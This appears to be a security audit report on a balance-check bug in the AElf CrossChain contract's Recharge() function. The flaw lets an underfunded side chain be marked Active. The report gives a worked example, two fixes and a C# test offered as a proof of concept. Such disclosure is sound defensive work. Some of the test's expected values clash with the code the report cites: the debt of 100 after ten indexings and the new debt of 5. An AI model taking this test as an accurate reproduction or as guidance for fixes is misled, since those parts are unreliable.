# Audit Report

## Title
Accounting Error in Recharge Function Allows Insufficient Balance to Mark Side Chain as Active

## Summary
The `Recharge()` function contains a double-counting error in its balance validation logic that allows side chains with indexing fee debt to be marked as Active with insufficient balance. This violates the critical invariant that Active side chains must have at least `IndexingPrice` tokens to pay for indexing operations.

## Finding Description

The vulnerability exists in the balance validation check within the `Recharge()` function. [1](#0-0) 

**Execution Flow:**

1. User calls `Recharge()` with `input.Amount` tokens
2. Tokens are transferred from user to the side chain's virtual address via `TransferFrom` [2](#0-1) 
3. If the side chain is in `IndexingFeeDebt` status, arrears are paid to proposers from the virtual address [3](#0-2) 
4. After arrears payment, `GetSideChainIndexingFeeDeposit()` retrieves the current virtual address balance [4](#0-3) 
5. The buggy assertion checks: `input.Amount + originBalance >= arrearsAmount + sideChainInfo.IndexingPrice` [5](#0-4) 

**The Critical Error:**

The `GetSideChainIndexingFeeDeposit()` function queries the token balance of the virtual address, which already includes the recharged amount minus paid arrears. [6](#0-5) 

Therefore:
- `originBalance` = `initial_balance + input.Amount - arrearsAmount`
- The assertion becomes: `input.Amount + (initial_balance + input.Amount - arrearsAmount) >= arrearsAmount + IndexingPrice`
- Simplifying: `2 * input.Amount + initial_balance >= 2 * arrearsAmount + IndexingPrice`

This double-counts `input.Amount`, making the check too lenient.

**Concrete Example:**
- Given: `initial_balance = 0`, `arrearsAmount = 100`, `IndexingPrice = 10`
- Correct requirement: recharge with 110 tokens
- Buggy check allows: recharging with only 105 tokens
- Result: side chain marked Active with balance of 5 (insufficient for the required 10)

**Why This Breaks Protocol:**

When the next indexing occurs, the `IndexSideChainBlockData` function attempts to deduct `IndexingPrice` from the balance. [7](#0-6) 

With only 5 tokens available (but needing 10), the `lockedToken` becomes negative, triggering the side chain to revert to `IndexingFeeDebt` status and accumulating new arrears. The proposer receives no payment.

## Impact Explanation

**Direct Protocol Impact:**
- **Invariant Violation**: The critical invariant that Active side chains must have `balance >= IndexingPrice` is broken
- **Reward Misdirection**: Proposers who index blocks for "Active" chains won't receive payment and accumulate arrears instead
- **Status Unreliability**: Side chain operators are misled about their chain's true operational status

**Quantified Damage:**
The underfunding gap ranges from ~4.5% to 25% depending on the ratio of arrears to indexing price. Using the example:
- Required: 110 tokens (100 arrears + 10 minimum balance)
- Actual: 105 tokens allowed by bug
- Shortfall: 5 tokens (4.5% underfunding)

This creates "zombie" Active chains that immediately revert to debt status upon the next indexing attempt, harming both operators and proposers.

## Likelihood Explanation

**High Likelihood:**

1. **Reachable Entry Point**: `Recharge()` is a public method callable by any user [8](#0-7) 

2. **Common Preconditions**: 
   - Side chains naturally enter `IndexingFeeDebt` status during normal operations when their balance depletes
   - Users routinely hold tokens and set allowances for the CrossChain contract

3. **Simple Execution**: Requires only a single transaction with a calculated amount - no complex sequences or race conditions

4. **Economic Incentive**: Users can save 5-25% of required recharge costs, representing significant value for large arrears

5. **Low Detection**: The transaction succeeds without reverting, and the error only manifests on the next indexing attempt, making it difficult to detect immediately

## Recommendation

Fix the assertion to correctly validate the remaining balance after arrears payment:

**Option 1** (Simplest): Check that the remaining balance is sufficient
```csharp
var originBalance = GetSideChainIndexingFeeDeposit(chainId);
Assert(originBalance >= sideChainInfo.IndexingPrice,
    "Indexing fee recharging not enough.");
```

**Option 2** (Explicit): Calculate and validate before paying arrears
```csharp
Assert(input.Amount >= arrearsAmount + sideChainInfo.IndexingPrice - GetSideChainIndexingFeeDeposit(chainId),
    "Indexing fee recharging not enough.");
```

Either fix ensures the side chain has at least `IndexingPrice` tokens remaining after all arrears are paid before marking it as Active.

## Proof of Concept

```csharp
[Fact]
public async Task RechargeForSideChain_InsufficientBalanceExploit()
{
    var parentChainId = 123;
    long lockedToken = 100;
    long indexingPrice = 10;
    long parentChainHeightOfCreation = 10;

    var sideChainId = await InitAndCreateSideChainAsync(
        parentChainHeightOfCreation, parentChainId, lockedToken, indexingPrice);

    // Create arrears of 100 by indexing 10 blocks (100 tokens consumed)
    var fakeSideChainBlockHash = HashHelper.ComputeFrom("hash");
    var fakeTxMerkleTreeRoot = HashHelper.ComputeFrom("root");
    
    for (int i = 1; i <= 10; i++)
    {
        var blockData = CreateSideChainBlockData(
            fakeSideChainBlockHash, i, sideChainId, fakeTxMerkleTreeRoot);
        await DoIndexAsync(new CrossChainBlockData 
            { SideChainBlockDataList = { blockData } }, new[] { sideChainId });
    }

    // Verify chain is in debt with balance = 0, debt = 100
    var chainStatus = await GetSideChainStatusAsync(sideChainId);
    chainStatus.ShouldBe(SideChainStatus.IndexingFeeDebt);
    var balance = await GetSideChainBalanceAsync(sideChainId);
    balance.ShouldBe(0);
    var debt = await CrossChainContractStub.GetSideChainIndexingFeeDebt
        .CallAsync(new Int32Value { Value = sideChainId });
    debt.Value.ShouldBe(100);

    // EXPLOIT: Recharge with only 105 tokens instead of required 110
    await ApproveBalanceAsync(105);
    await CrossChainContractStub.Recharge.SendAsync(new RechargeInput
    {
        ChainId = sideChainId,
        Amount = 105
    });

    // BUG: Chain is marked Active despite insufficient balance
    chainStatus = await GetSideChainStatusAsync(sideChainId);
    chainStatus.ShouldBe(SideChainStatus.Active); // Should still be IndexingFeeDebt!
    
    balance = await GetSideChainBalanceAsync(sideChainId);
    balance.ShouldBe(5); // Only 5 tokens, but IndexingPrice is 10!

    // IMPACT: Next indexing immediately fails and creates new arrears
    var nextBlock = CreateSideChainBlockData(
        fakeSideChainBlockHash, 11, sideChainId, fakeTxMerkleTreeRoot);
    await DoIndexAsync(new CrossChainBlockData 
        { SideChainBlockDataList = { nextBlock } }, new[] { sideChainId });
    
    chainStatus = await GetSideChainStatusAsync(sideChainId);
    chainStatus.ShouldBe(SideChainStatus.IndexingFeeDebt); // Back to debt immediately!
    
    debt = await CrossChainContractStub.GetSideChainIndexingFeeDebt
        .CallAsync(new Int32Value { Value = sideChainId });
    debt.Value.ShouldBe(5); // New arrears accumulated, proposer not paid
}
```

This test demonstrates that with only 105 tokens (instead of the required 110), the side chain is incorrectly marked as Active with a balance of 5 tokens. The next indexing attempt immediately reverts it to `IndexingFeeDebt` status, proving the invariant violation.

### Citations

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract.cs (L174-215)
```csharp
    public override Empty Recharge(RechargeInput input)
    {
        var chainId = input.ChainId;
        var sideChainInfo = State.SideChainInfo[chainId];
        Assert(sideChainInfo != null && sideChainInfo.SideChainStatus != SideChainStatus.Terminated,
            "Side chain not found or incorrect side chain status.");

        TransferFrom(new TransferFromInput
        {
            From = Context.Sender,
            To = Context.ConvertVirtualAddressToContractAddress(ConvertChainIdToHash(chainId)),
            Symbol = Context.Variables.NativeSymbol,
            Amount = input.Amount,
            Memo = "Indexing fee recharging."
        });

        long arrearsAmount = 0;
        if (sideChainInfo.SideChainStatus == SideChainStatus.IndexingFeeDebt)
        {
            // arrears
            foreach (var arrears in sideChainInfo.ArrearsInfo)
            {
                arrearsAmount += arrears.Value;
                TransferDepositToken(new TransferInput
                {
                    To = Address.Parser.ParseFrom(ByteString.FromBase64(arrears.Key)),
                    Symbol = Context.Variables.NativeSymbol,
                    Amount = arrears.Value,
                    Memo = "Indexing fee recharging."
                }, chainId);
            }

            var originBalance = GetSideChainIndexingFeeDeposit(chainId);
            Assert(input.Amount + originBalance >= arrearsAmount + sideChainInfo.IndexingPrice,
                "Indexing fee recharging not enough.");
        }

        sideChainInfo.ArrearsInfo.Clear();
        sideChainInfo.SideChainStatus = SideChainStatus.Active;
        State.SideChainInfo[chainId] = sideChainInfo;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L88-98)
```csharp
    private long GetSideChainIndexingFeeDeposit(int chainId)
    {
        SetContractStateRequired(State.TokenContract, SmartContractConstants.TokenContractSystemName);
        var balanceOutput = State.TokenContract.GetBalance.Call(new GetBalanceInput
        {
            Owner = Context.ConvertVirtualAddressToContractAddress(ConvertChainIdToHash(chainId)),
            Symbol = Context.Variables.NativeSymbol
        });

        return balanceOutput.Balance;
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L844-851)
```csharp
                lockedToken -= indexingPrice;

                if (lockedToken < 0)
                {
                    // record arrears
                    arrearsAmount += indexingPrice;
                    sideChainInfo.SideChainStatus = SideChainStatus.IndexingFeeDebt;
                }
```
